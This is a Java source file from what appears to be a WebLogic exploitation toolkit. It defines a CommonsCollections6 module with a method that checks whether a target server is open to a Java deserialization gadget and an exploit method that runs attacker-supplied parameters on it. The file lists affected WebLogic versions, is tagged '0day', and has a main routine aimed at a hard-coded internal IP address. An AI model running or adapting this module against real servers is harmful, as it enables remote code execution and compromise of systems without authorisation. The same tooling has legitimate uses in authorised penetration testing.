/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.weblogic.framework.vuls.impl;
import com.weblogic.framework.annotation.Authors;
import com.weblogic.framework.annotation.Dependencies;
import com.weblogic.framework.annotation.Tags;
import com.weblogic.framework.annotation.Versions;
import com.weblogic.framework.gadget.impl.CommonsCollections6Gadget;
import com.weblogic.framework.entity.VulCheckParam;
import com.weblogic.framework.utils.PayloadUtils;
import com.weblogic.framework.vuls.VulTest;
import com.weblogic.framework.utils.VulUtils;
import javax.naming.Context;

import static com.weblogic.framework.utils.ContextUtils.rebind;
import static com.weblogic.framework.utils.VersionUtils.getVersion;

/**
 * Title: CommonsCollections6
 * Desc: CommonsCollections6
 * Date:2020/4/5 3:48
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":JtaTransactionManager"})
@Versions({"10.3.6.0", "12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
@Tags({"0day"})
public class CommonsCollections6 implements VulTest {

    /**
     * 漏洞利用 jar 文件名称
     */
    public static final String[] VUL_DEPENDENCIES = new String[]{};

    /**
     * 漏洞影响版本
     */
    private static final String[] VUL_VERSIONS = new String[]{"10.3.5.0", "10.3.6.0", "10.3.6.0.0", "12.1.3.0", "12.1.3.0.0"};

    /**
     * remote
     */
    private Object remote = null;

    /**
     * bindName
     */
    private String bindName = "";

    /**
     * current context
     */
    private Context currentContext = null;


    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param url url
     * @param vulCheckParam 漏洞校验额外参数
     * @return 漏洞存在返回 true 否则返回 false
     * @throws Exception 抛出异常
     */
    @Override
    public Boolean vulnerable(String url, VulCheckParam vulCheckParam) throws Exception {
        return PayloadUtils.baseVulnerable(url, CommonsCollections6Gadget.class, this, vulCheckParam);
    }

    /**
     * 漏洞利用
     *
     * @param url url
     * @param param 利用参数
     * @throws Exception 抛出异常
     */
    @Override
    public String exploit(String url, String... param) throws Exception {
        return VulUtils.exploit(url, remote, param);
    }

    public static void main(String[] args) throws Exception {
        CommonsCollections6 commonsCollections6 = new CommonsCollections6();
        Boolean flag = commonsCollections6.vulnerable("http://10.128.133.106:7001/", null);
        System.out.println(flag);
    }
}
